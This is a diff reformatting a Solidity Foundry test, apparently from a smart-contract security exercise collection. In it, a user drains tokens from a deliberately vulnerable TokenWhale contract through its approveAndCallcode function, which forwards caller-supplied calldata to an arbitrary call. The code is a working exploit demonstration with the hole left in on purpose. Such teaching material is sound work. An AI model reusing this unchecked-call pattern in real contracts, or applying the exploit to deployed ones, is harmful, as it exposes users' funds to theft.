@@ -4,26 +4,27 @@ pragma solidity ^0.8.15;
 import "forge-std/Test.sol";
 
 contract ContractTest is Test {
-        TokenWhale TokenWhaleContract;
+    TokenWhale TokenWhaleContract;
 
-function testUnsafeCall() public {
- 
-    address alice = vm.addr(1);
-    address bob = vm.addr(2);
-    TokenWhaleContract = new TokenWhale();   
-    TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
-    console.log("TokenWhale balance:",TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
-  
-   // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
- 
-    console.log("Alice tries to perform unsafe call to transfer asset from TokenWhaleContract");
-    vm.prank(alice);  
-    TokenWhaleContract.approveAndCallcode(address(TokenWhaleContract),0,abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000));
-    console.log("Exploit completed");
-    console.log("TokenWhale balance:",TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
-    console.log("Alice balance:",TokenWhaleContract.balanceOf(address(alice)));
+    function testUnsafeCall() public {
+        address alice = vm.addr(1);
+        TokenWhaleContract = new TokenWhale();
+        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
+        console.log("TokenWhale balance:", TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
+
+        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
+
+        console.log("Alice tries to perform unsafe call to transfer asset from TokenWhaleContract");
+        vm.prank(alice);
+        TokenWhaleContract.approveAndCallcode(
+            address(TokenWhaleContract), 0, abi.encodeWithSignature("transfer(address,uint256)", address(alice), 1000)
+        );
+        console.log("Exploit completed");
+        console.log("TokenWhale balance:", TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
+        console.log("Alice balance:", TokenWhaleContract.balanceOf(address(alice)));
     }
-  receive() payable external{}
+
+    receive() external payable {}
 }
 
 contract TokenWhale {
@@ -44,7 +45,7 @@ contract TokenWhale {
     }
 
     function isComplete() public view returns (bool) {
-        return balanceOf[player] >= 1000000;
+        return balanceOf[player] >= 1000000; // 1 mil
     }
 
     event Transfer(address indexed from, address indexed to, uint256 value);
@@ -79,12 +80,15 @@ contract TokenWhale {
         _transfer(to, value);
     }
     /* Approves and then calls the contract code*/
-    function approveAndCallcode(address _spender, uint256 _value, bytes memory _extraData) public returns (bool success) {
-        allowance[msg.sender][_spender] = _value; 
- 
+
+    function approveAndCallcode(address _spender, uint256 _value, bytes memory _extraData)
+        public
+        returns (bool success)
+    {
+        allowance[msg.sender][_spender] = _value;
+
         //Call the contract code
-        _spender.call(_extraData);  //vulnerable point
-       // return true;
+        _spender.call(_extraData); //vulnerable point
+            // return true;
     }
 }
-
